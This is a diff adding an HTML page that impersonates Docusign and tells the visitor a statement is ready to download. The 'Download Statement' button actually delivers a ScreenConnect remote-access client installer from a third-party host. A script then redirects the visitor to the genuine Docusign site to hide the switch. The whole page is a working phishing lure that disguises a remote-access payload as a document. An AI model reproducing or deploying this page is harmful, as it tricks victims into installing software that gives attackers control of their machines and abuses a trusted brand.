@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Download</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f4f7fb;
+      color: #1f2937;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 520px;
+      background: #ffffff;
+      padding: 45px 35px;
+      border-radius: 18px;
+      text-align: center;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.10);
+    }
+
+    .logo {
+      width: 90px;
+      height: 90px;
+      margin-bottom: 20px;
+    }
+
+    h1 {
+      margin: 0 0 10px;
+      color: #123b72;
+      font-size: 28px;
+    }
+
+    .subtitle {
+      color: #6b7280;
+      margin-bottom: 30px;
+      line-height: 1.6;
+    }
+
+    .statement-box {
+      background: #f1f5f9;
+      border-radius: 12px;
+      padding: 18px;
+      margin-bottom: 25px;
+      text-align: left;
+    }
+
+    .statement-box strong {
+      display: block;
+      margin-bottom: 6px;
+      color: #123b72;
+    }
+
+    .download-btn {
+      display: inline-block;
+      width: 100%;
+      padding: 15px 20px;
+      background: #123b72;
+      color: white;
+      text-decoration: none;
+      border-radius: 9px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      border: none;
+      transition: background 0.2s;
+    }
+
+    .download-btn:hover {
+      background: #0d2d57;
+    }
+
+    .notice {
+      margin-top: 18px;
+      font-size: 13px;
+      color: #6b7280;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #9ca3af;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+
+    <!-- Example company logo -->
+    <img
+      class=""
+      src=""
+      alt=""
+    >
+
+    <h1>Docusign</h1>
+
+    <p class="subtitle">
+      Your statement is ready to download.
+    </p>
+
+    <!-- Download button -->
+    <a
+      class="download-btn"
+      href="https://alsabbancpa.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest?/yahoo.com"
+      download
+      onclick="redirectAfterDownload()"
+    >
+      Download Statement
+    </a>
+
+    <p class="notice">
+      Your download will begin automatically.
+      You will then be redirected to our website.
+    </p>
+
+    <div class="footer">
+      © Docusign, Inc. 2026. All rights reserved.
+    </div>
+
+  </div>
+
+  <script>
+    function redirectAfterDownload() {
+
+      // Give the browser a moment to start the download,
+      // then redirect to the company website.
+      setTimeout(function () {
+        window.location.href = "https://www.docusign.com/products/platform/app-center?/yahoo.com";
+      }, 2000);
+
+    }
+  </script>
+
+</body>
+</html>
